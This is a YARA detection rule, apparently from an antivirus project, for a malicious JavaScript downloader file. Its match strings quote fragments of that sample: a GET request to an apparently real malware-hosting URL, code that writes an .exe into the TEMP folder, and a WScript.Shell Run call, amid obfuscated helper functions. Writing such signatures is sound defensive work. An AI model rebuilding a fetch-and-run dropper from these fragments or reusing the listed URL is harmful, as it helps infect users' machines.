rule sig_20160329_04756d183c5c5fb522cf4eae63479c1a {
  meta:
    description = "datamaliciousorder - file 20160329_04756d183c5c5fb522cf4eae63479c1a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "71e6396638bce275b71bc4777f476fd9fcae25c02305804d9ad1a2191689d117"

  strings:
    $s1  = "dR[sx](\"GET\", \"http://lojaagrometal.com.br/mi3sa\", false);" fullword ascii
    $s2  = "function vX() {return wr[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"OqFOh7amp7Uqz.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[T](Qg() * 11); if (dR[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var wr = function kk() {return WScript[R](\"WScript.Shell\");}(), Ch = 11;" fullword ascii
    $s5  = "function Ym(Y, XP){X = X * 1; return Y - XP;};" fullword ascii
    $s6  = "function q(){return \"\" + x0;};" fullword ascii
    $s7  = "function SD(jA){wr[\"Run\"](jA, X, X);};" fullword ascii
    $s8  = "function M() {return ((R0 == true) && (R0 == o)) ? 1 : X;};" fullword ascii
    $s9  = " while (AS){" fullword ascii
    $s10 = "function AP(K) {var F = (1, 2, 3, 4, 5, K); return F;};" fullword ascii
    $s11 = "return Ym(mf, MU);" fullword ascii
    $s12 = "function Qg(){return 22;};" fullword ascii
    $s13 = "function Cf()" fullword ascii
    $s14 = "var l = new this[\"Date\"]();" fullword ascii
    $s15 = "function ru(){return R;};" fullword ascii
    $s16 = "o = true; " fullword ascii
    $s17 = "var js = false;" fullword ascii
    $s18 = "R0 = true; " fullword ascii
    $s19 = "var R0 = false;" fullword ascii
    $s20 = "} catch(OQ){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}